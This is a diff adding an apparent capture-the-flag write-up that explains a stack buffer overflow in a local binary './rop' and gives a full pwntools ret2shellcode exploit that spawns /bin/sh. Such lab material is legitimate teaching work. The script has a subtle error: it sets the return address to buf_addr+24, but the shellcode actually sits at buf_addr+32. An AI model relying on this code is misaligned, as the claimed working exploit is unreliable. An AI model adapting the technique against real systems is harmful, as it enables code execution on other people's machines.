@@ -1,1 +1,190 @@
+To solve this Capture the Flag (CTF) binary exploitation challenge using Pwntools, we'll perform a classic ret2shellcode attack on a 64-bit ELF executable. Here's a step-by-step guide along with the corresponding code.
 
+### **Challenge Analysis**
+
+**1. Vulnerability Identification:**
+
+- The program reads **0x400** bytes (1024 bytes) into a buffer that's only **16 bytes** long (`buf[2]` where each `__int64` is 8 bytes).
+- This leads to a **buffer overflow**, allowing us to overwrite the **saved return address** on the stack.
+
+**2. Executable Mitigations:**
+
+Based on the `checksec` output:
+
+- **NX (No eXecute)** is **disabled** (`"nx":"no"`), so the stack is executable.
+- **PIE (Position Independent Executable)** is **disabled** (`"pie":"no"`), so addresses are predictable.
+- **Canary** is **not present** (`"canary":"no"`), so no stack canary protection.
+
+**3. Information Leakage:**
+
+- The program prints the **stack address** of `buf`, which we'll use to calculate the exact location to place our shellcode.
+
+### **Exploitation Strategy**
+
+We will:
+
+1. **Leak** the stack address of `buf`.
+2. **Inject shellcode** into the stack.
+3. **Overwrite** the return address to point to our shellcode.
+
+### **Step-by-Step Solution**
+
+#### **1. Set Up the Environment**
+
+```python
+from pwn import *
+
+# Set the architecture context
+context.binary = './rop'  # Name of the binary
+context.arch = 'amd64'    # 64-bit architecture
+context.log_level = 'debug'  # To see detailed logs (optional)
+```
+
+#### **2. Start the Process**
+
+```python
+p = process('./rop')
+```
+
+#### **3. Receive Initial Outputs and Extract `buf` Address**
+
+```python
+# Receive the welcome message
+p.recvline()
+
+# Receive the line containing the buf address
+line = p.recvline()
+# Extract the address using regex
+import re
+m = re.search(r'\[(0x[0-9a-fA-F]+)\]', line.decode())
+buf_addr = int(m.group(1), 16)
+log.info(f"Buffer address: {hex(buf_addr)}")
+
+# Receive the prompt for input
+p.recvline()
+```
+
+#### **4. Calculate the Offset to Return Address**
+
+We need to find out how many bytes of padding are required to reach the return address.
+
+Since `buf` is at `rbp-0x10` and the saved return address is `rbp+8`, the offset is:
+
+```python
+offset = 24  # 16 bytes for buf + 8 bytes for saved base pointer
+```
+
+#### **5. Generate the Shellcode**
+
+We'll use Pwntools' `shellcraft` module to generate shellcode that spawns a shell.
+
+```python
+shellcode = asm(shellcraft.sh())
+log.info(f"Shellcode length: {len(shellcode)} bytes")
+```
+
+#### **6. Build the Payload**
+
+We'll construct the payload in the following order:
+
+- **Padding**: To fill up to the return address.
+- **Return Address Overwrite**: Overwrite the return address with the address pointing to our shellcode.
+- **Shellcode**: The actual code to execute.
+
+```python
+# The address where our shellcode starts
+shellcode_address = buf_addr + offset
+
+# Construct the payload
+payload = b'A' * offset                      # Padding to reach the return address
+payload += p64(shellcode_address)            # Overwrite return address with shellcode address
+payload += shellcode                         # Append the shellcode
+```
+
+#### **7. Send the Payload**
+
+```python
+# Send the payload to the program
+p.sendline(payload)
+```
+
+#### **8. Interact with the Shell**
+
+```python
+# Switch to interactive mode to use the shell
+p.interactive()
+```
+
+### **Full Exploit Script**
+
+Putting it all together:
+
+```python
+from pwn import *
+import re
+
+# Set the architecture context
+context.binary = './rop'
+context.arch = 'amd64'
+context.log_level = 'debug'
+
+# Start the process
+p = process('./rop')
+
+# Receive the welcome message
+p.recvline()
+
+# Receive the line containing the buf address
+line = p.recvline()
+# Extract the address using regex
+m = re.search(r'\[(0x[0-9a-fA-F]+)\]', line.decode())
+buf_addr = int(m.group(1), 16)
+log.info(f"Buffer address: {hex(buf_addr)}")
+
+# Receive the prompt for input
+p.recvline()
+
+# Calculate the offset to the return address
+offset = 24  # 16 bytes for buf + 8 bytes for saved base pointer
+
+# Generate the shellcode
+shellcode = asm(shellcraft.sh())
+log.info(f"Shellcode length: {len(shellcode)} bytes")
+
+# The address where our shellcode starts
+shellcode_address = buf_addr + offset
+
+# Build the payload
+payload = b'A' * offset                      # Padding to reach the return address
+payload += p64(shellcode_address)            # Overwrite return address with shellcode address
+payload += shellcode                         # Append the shellcode
+
+# Send the payload
+p.sendline(payload)
+
+# Interact with the shell
+p.interactive()
+```
+
+### **Explanation of the Exploit**
+
+- **Buffer Overflow**: We overflow the buffer to overwrite the return address.
+- **Return Address Overwrite**: We set the return address to the location of our shellcode on the stack.
+- **Shellcode Execution**: Since NX is disabled, the shellcode on the stack is executable.
+- **Gaining a Shell**: The shellcode spawns a shell (`/bin/sh`), giving us control.
+
+### **Testing the Exploit**
+
+- **Run the script**: Execute the Python script using `python3 exploit.py`.
+- **Verify the Shell**: If the exploit is successful, you should see a shell prompt.
+- **Try Commands**: Execute commands like `whoami`, `ls`, etc., to confirm shell access.
+
+### **Notes**
+
+- **ASLR Considerations**: Since PIE is disabled and the stack address is leaked, ASLR should not hinder the exploit.
+- **Environment**: Ensure that the exploit is run in the same environment as the challenge (e.g., local machine or provided VM) to avoid discrepancies.
+- **Permissions**: If you encounter permission issues, check that the binary has execute permissions (`chmod +x rop`).
+
+### **Summary**
+
+By leveraging the buffer overflow vulnerability and the lack of modern binary protections, we crafted an exploit that injects and executes shellcode on the stack, ultimately giving us a shell. This approach is a classic example of a **ret2shellcode** attack in binary exploitation challenges.
